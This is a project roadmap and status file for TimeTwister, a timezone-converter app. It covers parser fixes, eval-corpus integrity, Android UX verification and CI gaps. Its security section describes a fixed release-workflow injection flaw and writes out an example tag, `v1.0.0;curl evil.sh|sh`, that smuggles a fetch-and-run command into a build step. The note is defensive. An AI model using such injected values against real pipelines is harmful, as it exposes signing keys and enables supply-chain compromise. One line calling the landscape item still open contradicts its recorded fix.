# TimeTwister — what's left

Status as of **2026-07-25**, after the Swift port wave and the review pass that
followed it.

> **Read this first.** A six-agent review of the port found five ways the tool
> corrupted a real user's message, and the eval scored 100% throughout. The
> corpus contained no URL, no path, no code, and not one open defect — so the
> number was measuring the set it had been written against. All five are fixed
> and have corpus rows; the lesson is kept here because the same trap is easy to
> walk back into: **a green eval is a statement about corpus composition first
> and parser quality second.** The corpus now carries a `known_gap` row again, so
> the report's OPEN ITEMS section prints on every run instead of never.

The build works on a clean Windows box, both cores are hardened and scored
against the same corpus, and the README no longer claims things that aren't
true. What remains is listed below in the order it should be tackled, with the
reason for that order.

**Nothing here is distributed.** No release tag exists, `versionCode` is still 1,
and the iOS pipeline has never gone green.

---

## Where things stand

| | State |
|---|---|
| Shared Kotlin core | 276-row graded corpus, blocking gate 100%, overall 99.35% (five deliberate `known_gap` rows); 9 invariants over 500 seeded cases each; perf guarded. **63 tests** |
| Shared Swift core | Same corpus, same gate, same red-team suite, **all 9 invariants** on the same seeded inputs, perf guarded. Builds and tests without a Mac. **72 tests.** One known divergence left: `G109`, ICU folding U+212A KELVIN inside a case-insensitive ASCII class |
| Android app | Builds, installs, runs on a real AVD. Most UX paths hand-verified (below). **28 unit tests as of 2026-07-26** — before that the module had no test source set and CI's test step was passing vacuously |
| Desktop tray | Builds, tests, `jpackage` app-image runs without a system JVM. Swing/tray wiring untested. **71 tests** (composes the core in) |
| iOS app | Core is verified; the app, keyboard and share extension still need a Mac |
| CI | Android + desktop jobs sound. Swift core is covered twice as of 2026-07-26 — `xcodebuild` on macOS (always was) and a new fast `swift test` job for the SwiftPM path (**unverified: no remote, so it has never run**). iOS app build almost certainly never passed (no schemes were declared until recently, still unverified) |

Test loop — no Android SDK needed for either core:

```powershell
.\android\gradlew.bat -p desktop :core:test        # Kotlin core + eval + properties
cd ios; swift test                                 # Swift core + eval + red team
.\android\gradlew.bat -p android :app:assembleDebug
.\android\gradlew.bat -p desktop build             # desktop (also re-runs core)
```

Swift on Windows needs `vcvars64.bat` and `SDKROOT` in the environment first —
the exact block is in [ios/README.md](ios/README.md).

---

## Ranked work

### 1. ~~Run the app on an emulator~~ — **DONE 2026-07-25**

AVD `tw35` (API 35, Pixel 6, x86_64, hardware-accelerated) created and booted;
debug APK installed and driven via `adb`. **No crashes and no ANRs across every
path exercised.**

| path | result |
|---|---|
| First-run onboarding | Renders. The Compose toolbar mock shows `⋮` highlighted with TimeTwister *inside* the overflow — the step that used to be invisible |
| Read-only selection (`can we do 5pm CT`) | Toast: **"5pm CT (6pm ET · 4pm MT · 3pm PT) — copied (this text is read-only)"**. Previously a guaranteed silent no-op, and the most intuitive first thing a user tries |
| No detection (`lets meet at 5`) | Toast: **"No time found — try "5pm CT" or "17:00 ET""** — actionable, not generic |
| False positive (`use 12 pt font`) | Declines and says so. The headline P0, confirmed end-to-end |
| Live preview | Splices as you type |
| Dark mode | Clean dark surfaces, no white launch flash |

```powershell
& "$env:ANDROID_HOME\emulator\emulator.exe" -avd tw35 -no-snapshot-load -gpu swiftshader_indirect
adb install -r android\app\build\outputs\apk\debug\app-debug.apk
```

Still unverified by hand: the zone-picker search, the contacts-permission denial
path, the >4-zone cap warning, and rotation state retention.

### 2. ~~Decide whether Swift can be verified on Windows~~ — **DONE 2026-07-25: yes**

`DateFormatter.string(from:)` was the only blocker and it is gone —
`TimeConverter.formatted` now renders a 12-hour clock from calendar components
by hand. Worth doing on its own merits (a modulo is not a localisation problem,
and it kills the `DateFormatter` locale bug class), but the payoff is that the
core is testable on Windows and on a Linux CI runner instead of macOS only.

`ios/Package.swift` points at the same directories XcodeGen builds from, so
there is one copy of every file and the two build systems cannot drift.

### 3. ~~Port the hardening to Swift~~ — **DONE 2026-07-25**

All eight items, each covered by the regression that found it on the Kotlin
side: `maybeSplice` + read-only guard, stamp recognition/idempotence, the
disambiguator, the separator class (NBSP/narrow-NBSP/newline), unknown-zone
suppression, spelled-out/paired/bracketed zones, day markers, DST-gap refusal,
and a `shortLabel` that can never emit a raw IANA id.

**56 Swift tests, 100% on the shared corpus.** The corpus is read from the
Android tree, not copied, so a row cannot say one thing on Android and another
on iOS.

Three defects surfaced on the way and are worth remembering:

- Swift treats **CRLF as a single `Character`**, so `components(separatedBy: "\n")`
  matches nothing in a CRLF file. Use `split(whereSeparator: \.isNewline)`.
- **`NSTimeZone.default` is ignored by swift-corelibs.** The Kotlin suite's trick
  of pinning the process default looks like it works off a Mac and does not.
  `detect`/`splice`/`maybeSplice` now take an optional `defaultZone`.
- **`TimeZone.abbreviation(for:)` is backed by CLDR data corelibs doesn't carry**,
  so 13 rows rendered "3pm CEST" on a phone and "3pm UTC+2" on CI. Both cores now
  carry their own standard/daylight pairs for the five DST-observing zones they
  support. Kotlin got the same fix and the exposure there was worse: that corpus
  is scored on a desktop JVM but the app runs on Android, where `zzz` resolves
  through ICU and may answer `GMT+02:00` — the label would have degraded on
  device while every test stayed green.

### 4. ~~Quick wins~~ — **DONE 2026-07-25**, except the icon art

- [x] `StampDemo` is gated on `-Dtimetwister.demo=1` instead of `@Ignore`, and the
      build now forwards the property into the test JVM *and* turns on stdout
      forwarding. Both were needed — the README's command used to report
      "1 skipped", print nothing, and exit green.
- [x] The 5 `unverified` corpus rows are promoted to `unicode` (now blocking).
      They pass on a real JVM and a real Swift runtime. The `unverified`
      category is now empty — the ratchet moved up.
- [x] `allowBackup` paired with explicit `dataExtractionRules` +
      `fullBackupContent` allowlists, naming only the zone list and the first-run
      flag.
- [x] App icon: `roundIcon` declared and a `<monochrome>` layer added, so
      Android 13+ themed icons no longer fall back to the full-colour tile.
- [ ] **Open, owner call:** the icon still reads as "clock app", not "timezone
      converter". That is an art decision, not a mechanical one — say what you
      want and I'll draw it.

### 4b. Open items from the review pass — **next**

Everything a six-agent review turned up that is *not* yet fixed, worst first.
The message-corruption findings from that review are all closed; these are what
is left.

**Correctness / robustness**

- [x] ~~**The parser is O(n²) and only Android caps its input.**~~ **Fixed
      2026-07-26.** There were *three* quadratic paths, not the two the review
      found — the third was `stamps.any { … }`, O(stamps) per match, which the JVM
      absorbed well enough to hide (307 ms) and Swift did not (10.6 s). A moving
      index replaces it. 200 KB of stamped text: **34,123 ms → 48 ms** on Kotlin,
      189 ms on Swift. `PerformanceTest`/`PerformanceTests` guard both cores with
      absolute budgets ~25× the measured time. `MAX_INPUT_CHARS` moved into
      `TimeParser` and is now applied by the iOS extension, the desktop tray and
      Android; the keyboard clamps its context window to 512 characters.
- [x] ~~**Autumn fall-back is unhandled on both cores.**~~ **Closed as decided, not
      as fixed (D6, 2026-07-25).** An ambiguous wall clock (1:30am ET on 2026-11-01
      happens twice) resolves to the *earlier* instant — which is what
      `ZonedDateTime.of` and every calendar app do — and that choice is now pinned by
      a test in both red-team suites rather than left to chance.
      `isUnrepresentable` structurally cannot fire here: an ambiguous time round-trips
      perfectly, unlike a spring-forward gap. Refusing would decline an
      ordinary-looking input with an explanation nobody wants. Exposure is one hour,
      once a year, per zone, at 1-2am. Listed under "Accepted, not scheduled".
- [x] ~~**ICU `\b` ≠ Java `\b`.**~~ **Fixed 2026-07-26**, along with three other
      regex-dialect divergences a re-measured differential (24,210 inputs) turned
      up. The root cause in every case was the same: `\d`, `\b`, `$` and `(?i)` do
      not mean the same thing to `java.util.regex` and to ICU.
      - `\d` is `[0-9]` in Java and `\p{Nd}` in ICU. Worst finding of the day:
        `3pm UTC+2<ARABIC-INDIC FIVE>` substituted the **device zone** while still
        reporting `hadExplicitZone = true` — a seven-hour error — and
        `5:<AI-5>0pm ET` sent 5:50pm as **5pm**. Both patterns now spell `[0-9]`.
      - `\b` — `meet 5pm MSK<ZWJ>` converted on iOS with the time relabelled to the
        device zone. Replaced with the explicit ASCII lookbehind/lookahead.
      - VT/FF are line terminators to ICU, not Java, so `half past<VT>5pm ET`
        converted 5:00 on Android. Both now recognise the phrase.
      - `(?i)` — ICU folds U+212A KELVIN → `k` *inside* `[A-Za-z0-9]`. Both ASCII
        guards are now `(?-i:)`. **The token half is not fixable cleanly** (the zone
        alternation needs `(?i)`, and ICU has no ASCII-only case-insensitive mode):
        `5pm <KELVIN>ST` still converts on iOS only. That is `G109`, and it is why
        Kotlin reports 5 open items and Swift 6.

      All 13 cases are corpus rows, so both cores are held to identical output on
      every build rather than in a one-off report.
- [ ] `5pm ET/PT` leaves `/PT` dangling — `tzPair` lists only DST-pair
      abbreviations, not the bare region tokens. Left unfixed on purpose: absorbing
      the second token would silently drop a zone the writer named, and declining
      would pre-empt A003. Recorded as corpus row `G108` instead.

**Eval integrity** — the gate works (proved by mutation on both cores) and, as of
2026-07-26, is defensible in both directions:

- [x] ~~`ratio(n, 0)` returns 1.0, so a zero-row corpus passes.~~ Checked
      explicitly now, before the rate. On the Swift side the `XCTSkip` path used
      to disarm the guard and the gate together; it fails instead of skipping
      whenever it is demonstrably in a source checkout. Verified by hiding the
      corpus: three failures, no skips.
- [x] ~~The ratchet is bypassable without touching the constant.~~ Composition is
      pinned per category on both cores, the blocking set is pinned, and
      `falsePositives == 0` is an independent floor. Verified by deleting a row —
      both cores caught it; before the change the gate stayed at 100%.
- [x] ~~Harness config is duplicated per core with nothing asserting the copies
      agree.~~ `eval/config.tsv` is now the shared source and both harnesses
      assert against it. Verified by desyncing the clock: both fail.
- [x] ~~Swift is missing 6 of the 9 invariants.~~ All nine ported, exploring the
      same 500 inputs as Kotlin for the same seed.
- [x] ~~Three of the four §5 defects have no corpus row.~~ Two are fixed; the
      rest are `known_gap` rows (G105–G108). **Overall precision now reads 99.35%,
      not 100%** — the score says what is missing again, and OPEN ITEMS prints.
- [x] ~~`android/app` has **no `src/test` and no `androidTest`** — CI's
      `:app:testDebugUnitTest` passes vacuously.~~ **Fixed 2026-07-26.** 28 unit
      tests, no new dependency: the logic worth testing was lifted into
      `ProcessTextDecision.kt` (pure — the five ACTION_PROCESS_TEXT outcomes, which
      is the whole feature and had never been tested at all) and into
      `UserPreferences`' companion. The activity keeps only platform plumbing.
      - **The vacuity gate needed two halves, and the first version was inert.** A
        test listener plus `doLast` cannot fire when there are no tests, because
        Gradle marks the task NO-SOURCE and *skips* it — hiding `src/test` gave
        `BUILD SUCCESSFUL in 1s`, exactly the failure being guarded. There is now a
        `taskGraph.whenReady` source check as well. Both halves verified by making
        each failure happen: suite deleted → fails; floor raised to 29 against 28
        tests → fails.
      - **The `MAX_RECOMMENDED_ZONES` report was true, and worse than reported.**
        "Your zone + four US zones" is five entries — over the soft cap — so a fresh
        install opened settings already showing the red "too many zones" warning
        about a list the user had never touched. Not only outside the US: Phoenix,
        Anchorage and Honolulu hit it too, which is why it was invisible from a US
        desk. `computeDefaults(systemZone)` now trims to the cap, dropping Mountain
        (least populous; anyone who wants it is usually in it, and their own zone
        covers it). Pinned by tests at 15 zones incl. all four US ones.
- [x] ~~CI never runs `swift test`.~~ **Half of this was wrong** and worth
      correcting rather than "fixing": the macOS job already runs the full Swift core
      suite via `xcodebuild -only-testing:TimeTwisterCoreTests`, against the *same*
      source folder SwiftPM uses, so the Swift core was never untested in CI. The
      real gap was the **SwiftPM** path — `swift test`, the only way to run this core
      without a Mac — which nothing exercised, so `Package.swift` could break while
      every macOS build stayed green. Added a `swift-core` job on `swift:6.1`
      (~1 min, so it reports before the mac runner) that also asserts the shared
      corpus file is present, because `EvalCorpusTests` *skips* without it and a
      skipped eval gate is the vacuous pass this repo keeps re-learning.
      ⚠️ **Unverified: needs its first CI run.** There is no Linux here, and no git
      remote, so the job has never executed. `swift test` passes locally on Windows
      (72 tests) against the same manifest.

**Security / privacy** (nothing critical; full details in the review)

- [x] ~~Read-only path writes the whole converted message to the clipboard without
      `ClipDescription.EXTRA_IS_SENSITIVE`.~~ **Set 2026-07-26.** No API guard: it
      is a compile-time String constant, so it inlines and is ignored below 33.
      ⚠️ **Static verification only** — `dumpsys clipboard` returns nothing on
      Android 13+, so the flag cannot be observed from a shell. The code path was
      exercised (read-only intent, no crash); the suppression itself was not.
- [x] ~~README Privacy does not mention Android Auto Backup.~~ **Fixed 2026-07-26**
      — states plainly that the OS copies the zone list off the device even though
      the app has no Internet permission, links both rules files, and gives the two
      ways to opt out.
- [x] ~~`android-release.yml` interpolates a tag name into a `run:` block that holds
      the signing keystore.~~ **Fixed 2026-07-26.** Confirmed real: git permits
      `; $ \` ( )` in a tag, so `v1.0.0;curl evil.sh|sh` became a command in the one
      step holding the decoded keystore and all four signing secrets. Now passed via
      `env:` and quoted at point of use (the `ios-release.yml` pattern), plus
      `set -euo pipefail`, plus a second lock: the version step refuses any tag not
      matching `^[A-Za-z0-9._+-]+$` rather than sanitising it.

**UX** — all verified on a live AVD. Layout claims are checked against
**screenshots**; the accessibility tree turned out to be an unreliable oracle in
both directions (see the landscape entry).

- [x] ~~Launcher icon has zero safe-zone margin.~~ **Fixed 2026-07-26.** The
      artwork is a 72-wide clock drawn in its own 0..72 space, so translating by 18
      put the ring exactly on the safe-zone boundary. Scaled 0.83 about its own
      centre → ~60 diameter, ~6 of margin on every side, inside Material's 66
      keyline. Verified on the launcher: the ring now sits clear of the mask edge.
- [x] ~~Every search result is listed twice (once under "Common", once under
      "All").~~ **Fixed 2026-07-26**, and it dragged two more bugs out with it:
      the "All" header printed even with nothing beneath it, and "no matches" was
      keyed off the All list alone so it could claim nothing matched while matching
      rows sat directly above. Verified: `york` → exactly one New York row.
- [x] ~~🔴 **Zone picker unusable in landscape with the keyboard up.**~~ **Fixed
      2026-07-27, on the third attempt, by stopping being a `Dialog`.** The first two
      attempts are kept in the git history because the reason they failed *was* the
      diagnosis: a dialog owns its own window, that window never receives IME insets
      here, so `imePadding()` inside it was a silent no-op — and neither
      `decorFitsSystemWindows = false` nor `SOFT_INPUT_ADJUST_RESIZE` on the dialog's
      window changed it.
      `ZonePickerScreen` is now a full screen in the activity's own window, so it
      inherits the activity's insets and one `imePadding()` on the `Scaffold` does the
      job. `MainActivity` is pinned to `android:windowSoftInputMode="adjustResize"`,
      which is the documented other half of that contract, and a `BackHandler` restores
      the dismissal that came free with a dialog.
      - **A screen alone was not enough.** A landscape phone leaves ~390px above the
        keyboard and a top bar plus a search field is all of it, so the list still
        measured zero height. In a short viewport (`screenHeightDp < 480`) the top bar
        is dropped, Close moves inline with the field, and section headers are
        suppressed — a 45px header was a third of the only row available.
      - **Verified by tapping, not by looking.** With the keyboard up in landscape the
        first row now spans y=252..394 against a keyboard top of ~396, and typing
        `tokyo` then tapping the result **persisted it to disk** — the check the
        previous attempts failed. Portrait is unchanged (title, both section headers,
        10 rows, picking works), and the stale-settings race still measures 0/6.
- [x] ~~The false-positive decline reuses the no-detection string.~~ **Partly fixed,
      and the item was aimed at the wrong input** (the same way `half past 5` was).
      `use 12 pt font` contains no time, so "No time found" was *correct* there. The
      real defect is the **deliberate declines**, which are indistinguishable from
      it because `detectLast` returns null for both: `half past 5pm ET`, `1700 ET`,
      `call me at 5 ET`, `meet 7pm NPT`, and worst, `Standup is *5pm* CT` — where the
      user wrote a perfectly good time and zone, markup defeated the match, and the
      app replied "try 5pm CT". The string no longer asserts anything false, but
      telling the two apart needs a **decline reason out of `TimeParser` in both
      cores** plus corpus rows. Owner call: that is core work with a product decision
      attached (what to say per decline class), not a string change.
- [x] ~~No prominent disclosure before the contacts permission dialog.~~ **Fixed
      2026-07-26.** The existing rationale dialog only ever appeared *after* a
      denial, so nothing explained contacts access up front — and by then the user
      has spent their one re-ask. New disclosure states what is read (country codes
      only), that it happens on-device, that there is no Internet permission, and
      that declining costs nothing. Verified: it appears on tap, the system dialog
      has **not** been shown at that point, and Continue reaches it.

**UX (earlier findings)**

- [x] ~~🔴 **Intermittent stale settings UI.**~~ **Fixed and measured 2026-07-26.**
      The diagnosis was right: `targetZonesFlow()` returned `dataStore.data.map { … }`,
      a fresh Flow per call, and `collectAsState` keys its `LaunchedEffect` on flow
      *identity* — so every recomposition cancelled the DataStore subscription and
      started another. Closing the picker after an add is a recomposition, so the
      emission could land on the collector being torn down. Pinned at both ends
      (cached in `UserPreferences`, `remember`ed in `SettingsScreen`) because either
      one alone silently masks the other.
      - **Measured, not argued.** A 40% failure rate does not survive "looks right".
        A driver script (`uiautomator` tree, never pixels) ran the add cycle on a
        real AVD: **pre-fix 4/10 stale, post-fix 0/10** — under the pre-fix rate
        that is p ≈ 0.006. Every pre-fix failure reported `persisted=yes` with the
        screen showing exactly the four defaults, matching the bug report exactly.
      - **The trigger was not "adding a zone", it was "adding a zone on a cold
        start".** Hammering add/remove in a warm loop failed only 1 in 20, and both
        times on cycle 1. One add per fresh launch failed 4 in 10. The recomposition
        churn while the first frame settles is what widens the window — so the
        loop test everyone would reach for first is the one that nearly missed it.
      - **The probe found the bug in itself first.** Its initial version reported
        100% failure with `before=[]`: the zone rows sit mid-page and it was reading
        the tree scrolled to the top, so it saw no rows at all and blamed the app.
        A measurement that reports a real bug for the wrong reason is worse than no
        measurement — it now unions every scroll position.
      - A second, latent bug fell out of the same read: all three call sites passed
        `setTargetZones(zones ± x)` with `zones` captured from their own composition,
        so two adds built from the same snapshot would **silently drop the first
        zone** (entirely reachable in the suggestions dialog, which offers several
        Add buttons at once). Replaced with `addTargetZone`/`removeTargetZone`, which
        read-modify-write *inside* the DataStore transaction. Verified separately
        that remove still propagates and does not take the other zones with it —
        neither race probe could have caught a broken remove, because a remove that
        does nothing leaves the zone on screen, which reads as success.
The other five items from that emulator session — icon safe zone, landscape +
IME, duplicate search results, the decline message, and the contacts disclosure —
are in the **UX** block above, where their outcomes are recorded. Four are fixed;
the landscape one is still open and says why.

### 5. Parser gaps that still mislead

Confirmed still-open behaviour, all verifiable locally on both cores now, all
drop into the existing corpus + regression suites:

- [ ] **Ranges** — `3-5pm ET` converts only the last endpoint, so the stamp reads as
      if a two-hour window maps to a single time. *(Blocked on A001 — it is a
      question about what the output should even look like, and guessing would be
      worse than leaving it red. Now visible as corpus row `G107`.)*
- [x] ~~**`5.30pm`**~~ **Fixed 2026-07-26.** A dot counts as a minute separator
      only when am/pm confirms it — accept it unconditionally and "3.50 pt"
      becomes a time, walking the whole false-positive class back in through a
      side door.
- [x] ~~**`1700 UTC`**~~ **Fixed 2026-07-26**, with a restriction found by probing
      rather than reasoning: the zone must be **3+ characters**. With two-letter
      zones accepted, "we ran 1200 CT scans" was rewritten mid-sentence — and the
      worse collisions are units, "1500 MT" (metric tons) and "2000 PT"
      (physical-therapy sessions). The cost is `1700 ET`, a genuine usage, logged
      as `G106` rather than pretended away.
- [x] ~~**`half past 5`** — silently does nothing~~ **Resolved 2026-07-25, and the
      item was aimed at the wrong input.** `half past 5 ET` is *correctly* declined:
      it has no am/pm, so it fails the disambiguator exactly like a bare `5 ET`, and
      supporting it would mean guessing morning or evening. The real defect was next
      door and nobody had written it down — `half past 5pm ET` **converted 5:00**,
      rendering "(4pm CT · 2pm PT)" under a sentence that says half past. A silent
      30-minute error, both cores, no corpus coverage. Same for `quarter past`,
      `quarter to` and the numeric forms. All now decline; 7 corpus rows, including
      two that check the guard does not over-decline (`I'll get to 5pm ET later`,
      `half the team joins 5pm ET`).

### 6. Property tests for the Swift core

The last real gap between the two suites. Kotlin's `PropertyTest` enforces 9
invariants over 500 seeded cases each — idempotence, no-drop, boundary
stability. Swift has the corpus and the regressions but nothing generative, so a
class of bug that only shows up under volume is currently Kotlin-only.

### 7. `:app` unit tests

The largest untested surface, but most of it is Android-framework-bound (Toast,
clipboard, intents). Honest coverage needs **Robolectric** (a new dependency —
your call) or instrumentation tests (the emulator now exists). Without one of
those, only a thin pure-logic slice is reachable, which is worth less than the
line count suggests.

### 8. Desktop Swing/tray seams

Headless exit, the `AWTException` fallback, and the duplicate-window guard are
reasoned-correct and completely uncovered. Needs refactoring for injectable seams
before it can be tested at all.

---

## Blocked on an owner decision

These aren't work items — they're forks in the road.

### D1. `READ_CONTACTS`: keep or drop?
Declared unconditionally for one convenience button. On the Play listing it
surfaces as "Contacts", which forces a Data-safety declaration, a
prominent-disclosure flow, and a privacy-policy URL that doesn't exist. Dropping
it — or moving it behind a separate flavour — removes all of that.

### D2. Desktop global hotkey
Not achievable in pure JDK; AWT only sees events the OS already routed to this
process. Options:

| Option | Cost |
|---|---|
| `jkeymaster` | ~40 KB, but drags in JNA + ~2.5 MB of native stubs. Upstream quiet for years |
| `JNativeHook` | ~1 MB. Installs a **system-wide input hook** — a keylogger by construction. AV/EDR will flag it; macOS demands Accessibility permission. Hard to square with the "no third-party SDKs" privacy line |
| Hand-rolled JNI | No dependency, but three native shims to build, sign and maintain |
| Leave window-scoped | Current state. Ctrl+Shift+T works only when the settings window has focus |

Without one, the tray flow is slower than doing the timezone math by hand.

### D3. Eight ambiguous parser cases
Non-blocking in the corpus (`category=ambiguous`), each with a proposed answer
awaiting adjudication. `A001` gates the ranges work in item 5.

| id | input | question |
|---|---|---|
| A001 | `5pm-6pm ET` | convert both endpoints, or last only? |
| A002 | `between 4 and 6pm ET` | should the bare `4` inherit ET? |
| A003 | `5pm ET/8pm PT` | user already converted by hand — no-op? |
| A004 | `2pm sydney and 9am ET` | stamp both times? |
| A005 | `(6pm PT)` | already parenthesised — nest, or special-case? |
| A006 | `5pm est/edt` | absorb the pair (current) or refuse? |
| A007 | `17h00 CET` | European notation — in scope? |
| A008 | `tomorrow 9am` | "tomorrow" is ignored by the roll-forward heuristic |

### ~~D6. Ambiguous wall-clock times~~ — **decided 2026-07-25: keep, pin, document**
See "Accepted, not scheduled". Both cores take the earlier instant, which is the
conventional reading, and a test in each red-team suite now pins it so the
behaviour cannot drift silently.

### ~~D7. `half past 5 ET`~~ — **resolved 2026-07-25; the question was mis-aimed**
The corpus row was right and the roadmap item was wrong. See §5.

### D4. Signing material
Android keystore; six Apple secrets. Needed before anything reaches a person.

### D5. A Mac session
The only way to prove iOS CI works, and now the *only* thing standing between the
Swift core and a shippable iOS build — the logic itself is verified. Gates every
remaining iOS item.

---

## Before anyone else can install this

1. **Release build isn't configured** — `isMinifyEnabled = false`, and
   `proguard-rules.pro` still says *"TimeTwister doesn't ship a release build yet"*
2. **AAB + versionCode plumbing is wired but never exercised** — needs one dry-run
   tag to prove the tag→version derivation works
3. **iOS CI has never passed** (D5)
4. **Signing material** (D4)
5. **Play listing shape** depends on D1

---

## Accepted, not scheduled

- **An ambiguous wall clock resolves to the earlier of its two instants, silently.**
  On an autumn fall-back the hour repeats, so `1:30am ET` on 2026-11-01 names both
  05:30Z and 06:30Z. We take the first. This is not the spring-forward case — that
  one asks us to invent a time that does not exist and is refused; this one asks us
  to choose between two that do, and an ambiguous time round-trips perfectly, so
  the gap guard structurally cannot fire. The earlier instant is what
  `ZonedDateTime.of`, `Calendar.date(from:)` and every calendar app default to, and
  the exposure is one hour a year per zone at 1-2am. Refusing would decline an
  ordinary-looking input with an explanation nobody wants; a marker would hang off
  the source label and read as noise. **Both cores agree**, which is the part that
  matters — a stamp is worthless if the two platforms disagree about which hour it
  means. Pinned by `anAmbiguousWallClockResolvesToTheEarlierOfItsTwoInstants` in
  both red-team suites.
- Cached zone list can go stale if the device zone changes and Settings is never opened
- Desktop has no autostart-on-login
- `values-night` only takes effect at API 29+; `minSdk` is 26
